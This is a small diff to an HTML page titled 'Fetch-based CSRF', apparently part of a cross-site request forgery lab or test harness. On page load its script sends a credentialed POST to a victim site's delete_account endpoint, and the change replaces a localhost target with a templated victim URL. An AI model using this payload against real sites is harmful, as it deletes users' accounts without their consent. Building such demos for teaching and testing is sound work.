@@ -9,7 +9,7 @@
     <h1>Fetch-based CSRF</h1>
     <script>
         window.addEventListener('load', function () {
-            fetch('http://localhost:5000/delete_account', {
+            fetch('{{ victim_url }}/delete_account', {
                 method: 'POST',
                 credentials: 'include'
             }).then(function () {
